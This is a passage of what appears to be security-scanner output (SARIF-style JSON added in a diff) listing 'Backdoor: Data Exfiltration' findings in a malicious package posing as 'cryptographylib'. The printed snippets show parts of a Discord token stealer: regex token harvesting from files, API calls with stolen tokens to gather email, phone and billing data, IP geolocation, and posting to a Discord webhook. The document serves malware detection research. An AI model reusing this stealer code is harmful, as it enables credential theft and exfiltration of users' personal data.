+                      "markdown": "`            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n            billing = bool(len(json.loads(httpx.get(self.dscap1 + \"/billing/payment-sources\", headers=self.g3t_H(token)).text)) > 0)\r\n\r\n\r\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nBilling?: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nPhone: {phone}\\nToken: {token}\\nEmail: {email}\\n\\n\")\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 937,
+                  "startColumn": 30,
+                  "endLine": 937,
+                  "endColumn": 35,
+                  "snippet": {
+                    "text": "\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n            billing = bool(len(json.loads(httpx.get(self.dscap1 + \"/billing/payment-sources\", headers=self.g3t_H(token)).text)) > 0)\r\n",
+                    "rendered": {
+                      "text": "\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n            billing = bool(len(json.loads(httpx.get(self.dscap1 + \"/billing/payment-sources\", headers=self.g3t_H(token)).text)) > 0)\r\n",
+                      "markdown": "`\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n            billing = bool(len(json.loads(httpx.get(self.dscap1 + \"/billing/payment-sources\", headers=self.g3t_H(token)).text)) > 0)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 936,
+                  "startColumn": 39,
+                  "endLine": 936,
+                  "endColumn": 44,
+                  "snippet": {
+                    "text": "                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n",
+                    "rendered": {
+                      "text": "                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n",
+                      "markdown": "`                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 936,
+                  "startColumn": 21,
+                  "endLine": 936,
+                  "endColumn": 26,
+                  "snippet": {
+                    "text": "                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n",
+                    "rendered": {
+                      "text": "                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n",
+                      "markdown": "`                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 935,
+                  "startColumn": 21,
+                  "endLine": 935,
+                  "endColumn": 26,
+                  "snippet": {
+                    "text": "            if (badges == \"\"):\r\n                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n",
+                    "rendered": {
+                      "text": "            if (badges == \"\"):\r\n                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n",
+                      "markdown": "`            if (badges == \"\"):\r\n                badges = \"None\"\r\n\r\n            email = j.get(\"email\")\r\n            phone = j.get(\"phone\") if j.get(\"phone\") else \"No Phone Number attached\"\r\n            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 906,
+                  "startColumn": 50,
+                  "endLine": 906,
+                  "endColumn": 55,
+                  "snippet": {
+                    "text": "\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n            flags = j['flags']\r\n",
+                    "rendered": {
+                      "text": "\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n            flags = j['flags']\r\n",
+                      "markdown": "`\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n            flags = j['flags']\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 906,
+                  "startColumn": 20,
+                  "endLine": 906,
+                  "endColumn": 25,
+                  "snippet": {
+                    "text": "\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n            flags = j['flags']\r\n",
+                    "rendered": {
+                      "text": "\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n            flags = j['flags']\r\n",
+                      "markdown": "`\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n            flags = j['flags']\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 905,
+                  "startColumn": 21,
+                  "endLine": 905,
+                  "endColumn": 26,
+                  "snippet": {
+                    "text": "        f = open(self.dir + \"\\\\Discord_Info.txt\", \"w\", encoding=\"cp437\", errors='ignore')\r\n\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n",
+                    "rendered": {
+                      "text": "        f = open(self.dir + \"\\\\Discord_Info.txt\", \"w\", encoding=\"cp437\", errors='ignore')\r\n\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n",
+                      "markdown": "`        f = open(self.dir + \"\\\\Discord_Info.txt\", \"w\", encoding=\"cp437\", errors='ignore')\r\n\r\n        for token in self.tokens:\r\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\r\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\r\n\r\n            badges = \"\"\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 683,
+                  "startColumn": 44,
+                  "endLine": 683,
+                  "endColumn": 49,
+                  "snippet": {
+                    "text": "                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\r\n                        for token in re.findall(self.regex, line):\r\n                            try:\r\n                                r = requests.get(self.baseurl, headers={\r\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                    'Content-Type': 'application/json',\r\n                                    'Authorization': token})\r\n",
+                    "rendered": {
+                      "text": "                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\r\n                        for token in re.findall(self.regex, line):\r\n                            try:\r\n                                r = requests.get(self.baseurl, headers={\r\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                    'Content-Type': 'application/json',\r\n                                    'Authorization': token})\r\n",
+                      "markdown": "`                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\r\n                        for token in re.findall(self.regex, line):\r\n                            try:\r\n                                r = requests.get(self.baseurl, headers={\r\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                    'Content-Type': 'application/json',\r\n                                    'Authorization': token})\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 663,
+                  "startColumn": 44,
+                  "endLine": 663,
+                  "endColumn": 49,
+                  "snippet": {
+                    "text": "                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\r\n                        for token in re.findall(self.regex, line):\r\n                            try:\r\n                                r = requests.get(self.baseurl, headers={\r\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                    'Content-Type': 'application/json',\r\n                                    'Authorization': token})\r\n",
+                    "rendered": {
+                      "text": "                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\r\n                        for token in re.findall(self.regex, line):\r\n                            try:\r\n                                r = requests.get(self.baseurl, headers={\r\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                    'Content-Type': 'application/json',\r\n                                    'Authorization': token})\r\n",
+                      "markdown": "`                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\r\n                        for token in re.findall(self.regex, line):\r\n                            try:\r\n                                r = requests.get(self.baseurl, headers={\r\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                    'Content-Type': 'application/json',\r\n                                    'Authorization': token})\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 645,
+                  "startColumn": 48,
+                  "endLine": 645,
+                  "endColumn": 53,
+                  "snippet": {
+                    "text": "                                except ValueError:\r\n                                    pass\r\n                                try:\r\n                                    r = requests.get(self.baseurl, headers={\r\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                        'Content-Type': 'application/json',\r\n                                        'Authorization': token})\r\n",
+                    "rendered": {
+                      "text": "                                except ValueError:\r\n                                    pass\r\n                                try:\r\n                                    r = requests.get(self.baseurl, headers={\r\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                        'Content-Type': 'application/json',\r\n                                        'Authorization': token})\r\n",
+                      "markdown": "`                                except ValueError:\r\n                                    pass\r\n                                try:\r\n                                    r = requests.get(self.baseurl, headers={\r\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\r\n                                        'Content-Type': 'application/json',\r\n                                        'Authorization': token})\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 401,
+                  "startColumn": 25,
+                  "endLine": 401,
+                  "endColumn": 31,
+                  "snippet": {
+                    "text": "                    httpx.post(self.discord_webhook, json=ping1)\r\n            if self.pingtype == \"@here\" or self.pingtype == \"here\":\r\n                if self.regex_webhook_dsc in self.discord_webhook :\r\n                    httpx.post(self.discord_webhook, json=ping2)\r\n\r\n\r\n\r\n",
+                    "rendered": {
+                      "text": "                    httpx.post(self.discord_webhook, json=ping1)\r\n            if self.pingtype == \"@here\" or self.pingtype == \"here\":\r\n                if self.regex_webhook_dsc in self.discord_webhook :\r\n                    httpx.post(self.discord_webhook, json=ping2)\r\n\r\n\r\n\r\n",
+                      "markdown": "`                    httpx.post(self.discord_webhook, json=ping1)\r\n            if self.pingtype == \"@here\" or self.pingtype == \"here\":\r\n                if self.regex_webhook_dsc in self.discord_webhook :\r\n                    httpx.post(self.discord_webhook, json=ping2)\r\n\r\n\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 398,
+                  "startColumn": 25,
+                  "endLine": 398,
+                  "endColumn": 31,
+                  "snippet": {
+                    "text": "        if self.pingonrun == \"yes\":\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                if self.pingtype == \"@everyone\" or self.pingtype == \"everyone\":\r\n                    httpx.post(self.discord_webhook, json=ping1)\r\n            if self.pingtype == \"@here\" or self.pingtype == \"here\":\r\n                if self.regex_webhook_dsc in self.discord_webhook :\r\n                    httpx.post(self.discord_webhook, json=ping2)\r\n",
+                    "rendered": {
+                      "text": "        if self.pingonrun == \"yes\":\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                if self.pingtype == \"@everyone\" or self.pingtype == \"everyone\":\r\n                    httpx.post(self.discord_webhook, json=ping1)\r\n            if self.pingtype == \"@here\" or self.pingtype == \"here\":\r\n                if self.regex_webhook_dsc in self.discord_webhook :\r\n                    httpx.post(self.discord_webhook, json=ping2)\r\n",
+                      "markdown": "`        if self.pingonrun == \"yes\":\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                if self.pingtype == \"@everyone\" or self.pingtype == \"everyone\":\r\n                    httpx.post(self.discord_webhook, json=ping1)\r\n            if self.pingtype == \"@here\" or self.pingtype == \"here\":\r\n                if self.regex_webhook_dsc in self.discord_webhook :\r\n                    httpx.post(self.discord_webhook, json=ping2)\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 230,
+                  "startColumn": 25,
+                  "endLine": 230,
+                  "endColumn": 30,
+                  "snippet": {
+                    "text": "\r\n    @staticmethod\r\n    def fetch_conf(e: str) -> str or bool | None:\r\n        return __config__.get(e)\r\n\r\n\r\n\r\n",
+                    "rendered": {
+                      "text": "\r\n    @staticmethod\r\n    def fetch_conf(e: str) -> str or bool | None:\r\n        return __config__.get(e)\r\n\r\n\r\n\r\n",
+                      "markdown": "`\r\n    @staticmethod\r\n    def fetch_conf(e: str) -> str or bool | None:\r\n        return __config__.get(e)\r\n\r\n\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 224,
+                  "startColumn": 22,
+                  "endLine": 224,
+                  "endColumn": 27,
+                  "snippet": {
+                    "text": "            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n        return [ip, city, country, region, org, loc, googlemap]\r\n\r\n",
+                    "rendered": {
+                      "text": "            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n        return [ip, city, country, region, org, loc, googlemap]\r\n\r\n",
+                      "markdown": "`            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n        return [ip, city, country, region, org, loc, googlemap]\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 223,
+                  "startColumn": 22,
+                  "endLine": 223,
+                  "endColumn": 27,
+                  "snippet": {
+                    "text": "            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n        return [ip, city, country, region, org, loc, googlemap]\r\n",
+                    "rendered": {
+                      "text": "            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n        return [ip, city, country, region, org, loc, googlemap]\r\n",
+                      "markdown": "`            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n        return [ip, city, country, region, org, loc, googlemap]\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 222,
+                  "startColumn": 25,
+                  "endLine": 222,
+                  "endColumn": 30,
+                  "snippet": {
+                    "text": "            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n",
+                    "rendered": {
+                      "text": "            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n",
+                      "markdown": "`            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 221,
+                  "startColumn": 26,
+                  "endLine": 221,
+                  "endColumn": 31,
+                  "snippet": {
+                    "text": "            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n",
+                    "rendered": {
+                      "text": "            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n",
+                      "markdown": "`            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n            loc = data.get('loc')\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
